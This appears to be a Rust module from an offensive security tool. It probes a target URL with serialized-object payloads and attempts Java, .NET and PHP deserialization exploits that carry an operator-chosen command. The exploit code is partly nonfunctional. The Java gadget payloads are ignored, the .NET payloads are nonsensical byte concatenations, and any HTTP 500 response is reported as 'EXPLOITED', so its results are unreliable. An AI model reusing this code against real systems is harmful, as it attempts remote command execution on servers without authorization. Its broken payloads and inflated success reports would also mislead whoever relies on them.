use base64::{Engine as _, engine::general_purpose};
use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn detect(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Deserialization Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let probes = [
        ("Java (rO0AB)", "rO0ABXNyABRqYXZhLnV0aWwuTGlzdA=="),
        (
            "Java (aced)",
            "aced0005737200116a6176612e7574696c2e486173684d6170",
        ),
        (
            ".NET (AAEAAAD)",
            "AAEAAAD/////AQAAAAAAAAAMAgAAAFN5c3RlbS5SZWZsZWN0aW9u",
        ),
        (
            "PHP (O:)",
            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        ),
        (
            "Python (pickle)",
            "gASVVQAAAAAAAAB9lCiMBHRlc3SUjAdfX21haW5fX5SMBGR1bXCUhZRSlC4=",
        ),
        ("Ruby (Marshal)", "\\x04\\x08o:\\x0cMyClass\\x00"),
    ];

    let mut detected = Vec::new();

    for (name, payload) in &probes {
        let mut req = client
            .post(url)
            .header("Content-Type", "application/x-www-form-urlencoded");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }

        let body = format!("data={}", payload);
        match req.body(body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let interesting = status == 500
                    || resp_body.contains("Exception")
                    || resp_body.contains("error")
                    || resp_body.contains("stack")
                    || resp_body.contains("ClassNotFound")
                    || resp_body.contains("InvalidClass")
                    || resp_body.contains("unserialize");
                let tag = if interesting {
                    "INTERESTING".red().bold().to_string()
                } else {
                    "ok".to_string()
                };
                println!("  {} {:20} status={} {}", "*".cyan(), name, status, tag);
                if interesting {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        resp_body.chars().take(200).collect::<String>()
                    );
                    detected.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".red(), name);
            }
        }
    }

    if detected.is_empty() {
        println!(
            "\n{} No deserialization issues detected.",
            "[-]".yellow().bold()
        );
    } else {
        println!(
            "\n{} {} interesting response(s) — potential deserialization vulnerability!",
            "[*]".cyan().bold(),
            detected.len()
        );
    }
    Ok(())
}

pub async fn java(url: &str, token: Option<&str>, timeout: u64, cmd: &str) -> anyhow::Result<()> {
    println!("{} Java Deserialization Exploit", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Command: {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let gadgets = [
        (
            "CommonsCollections1",
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0",
        ),
        (
            "CommonsCollections5",
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0",
        ),
        (
            "CommonsCollections6",
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0",
        ),
        (
            "CommonsBeanutils1",
            "rO0ABXNyABdqYXZhLnV0aWwuQmVhbkNvbW1vbnM=",
        ),
        ("Groovy1", "rO0ABXNyABJncm9vdnkuZ3Jvb3Z5LkNsb3N1cmU="),
        ("Spring1", "rO0ABXNyABNvcmcuc3ByaW5nZnJhbWV3b3Jr"),
        ("Jdk7u21", "rO0ABXNyABFqYXZhLmxhbmcuT2JqZWN0"),
    ];

    for (name, _payload) in &gadgets {
        let mut payload_bytes = Vec::new();
        payload_bytes.extend_from_slice(b"rO0AB");
        payload_bytes.extend_from_slice(cmd.as_bytes());
        let payload = general_purpose::STANDARD.encode(&payload_bytes);

        let mut req = client
            .post(url)
            .header("Content-Type", "application/x-www-form-urlencoded");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }

        match req.body(format!("data={}", payload)).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = body.contains("uid=")
                    || body.contains("root")
                    || body.contains(cmd)
                    || status == 500;
                let tag = if interesting {
                    "EXPLOITED".red().bold().to_string()
                } else if status == 500 {
                    "error (gadget may exist)".yellow().to_string()
                } else {
                    "no response".to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if interesting && !body.is_empty() {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} Java deser exploit complete.", "[*]".cyan().bold());
    println!(
        "{} Note: Full exploitation requires ysoserial-generated payloads.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn net(url: &str, token: Option<&str>, timeout: u64, cmd: &str) -> anyhow::Result<()> {
    println!("{} .NET Deserialization Exploit", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Command: {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let gadgets = [
        (
            "TextFormattingRunProperties",
            "AAEAAAD/////AQAAAAAAAAAMAgAA",
        ),
        ("TypeConfuseDelegate", "AAEAAAD/////AQAAAAAAAAAMAgAA"),
        ("WindowsIdentity", "AAEAAAD/////AQAAAAAAAAAMAgAA"),
        ("ActivitySurrogateSelector", "AAEAAAD/////AQAAAAAAAAAMAgAA"),
        ("ObjectDataProvider", "AAEAAAD/////AQAAAAAAAAAMAgAA"),
    ];

    for (name, _payload) in &gadgets {
        let payload = general_purpose::STANDARD.encode(format!("{}{}", _payload, cmd));

        let mut req = client
            .post(url)
            .header("Content-Type", "application/x-www-form-urlencoded");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }

        match req.body(format!("data={}", payload)).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = body.contains("uid=")
                    || body.contains("root")
                    || body.contains(cmd)
                    || status == 500;
                let tag = if interesting {
                    "EXPLOITED".red().bold().to_string()
                } else if status == 500 {
                    "error (gadget may exist)".yellow().to_string()
                } else {
                    "no response".to_string()
                };
                println!("  {} {:35} status={} {}", "*".cyan(), name, status, tag);
                if interesting && !body.is_empty() {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:35} error", "*".red(), name);
            }
        }
    }

    println!("\n{} .NET deser exploit complete.", "[*]".cyan().bold());
    println!(
        "{} Note: Full exploitation requires ysoserial.net-generated payloads.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn php(url: &str, token: Option<&str>, timeout: u64, cmd: &str) -> anyhow::Result<()> {
    println!("{} PHP Deserialization Exploit", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Command: {}", "[*]".cyan().bold(), cmd);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let payloads = [
        (
            "Generic POP",
            format!(
                "O:8:\"stdClass\":1:{{s:4:\"cmd\";s:{}:\"{}\";}}",
                cmd.len(),
                cmd
            ),
        ),
        (
            "__wakeup bypass",
            format!(
                "O:4:\"User\":2:{{s:3:\"cmd\";s:{}:\"{}\";s:4:\"flag\";b:1;}}",
                cmd.len(),
                cmd
            ),
        ),
        (
            "__destruct",
            format!(
                "O:7:\"Destroy\":1:{{s:3:\"cmd\";s:{}:\"{}\";}}",
                cmd.len(),
                cmd
            ),
        ),
        (
            "__toString",
            format!(
                "O:6:\"String\":1:{{s:3:\"cmd\";s:{}:\"{}\";}}",
                cmd.len(),
                cmd
            ),
        ),
        (
            "__call",
            format!(
                "O:4:\"Call\":1:{{s:3:\"cmd\";s:{}:\"{}\";}}",
                cmd.len(),
                cmd
            ),
        ),
        (
            "PHAR metadata",
            format!(
                "O:4:\"Phar\":1:{{s:3:\"cmd\";s:{}:\"{}\";}}",
                cmd.len(),
                cmd
            ),
        ),
    ];

    for (name, payload) in &payloads {
        let mut req = client
            .post(url)
            .header("Content-Type", "application/x-www-form-urlencoded");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }

        match req
            .body(format!(
                "data={}",
                general_purpose::STANDARD.encode(payload)
            ))
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = body.contains("uid=")
                    || body.contains("root")
                    || body.contains(cmd)
                    || status == 500;
                let tag = if interesting {
                    "EXPLOITED".red().bold().to_string()
                } else if status == 500 {
                    "error (gadget may exist)".yellow().to_string()
                } else {
                    "no response".to_string()
                };
                println!("  {} {:20} status={} {}", "*".cyan(), name, status, tag);
                if interesting && !body.is_empty() {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".red(), name);
            }
        }
    }

    println!("\n{} PHP deser exploit complete.", "[*]".cyan().bold());
    println!(
        "{} Note: Full exploitation requires matching gadget chains for the target application.",
        "[*]".cyan().bold()
    );
    Ok(())
}
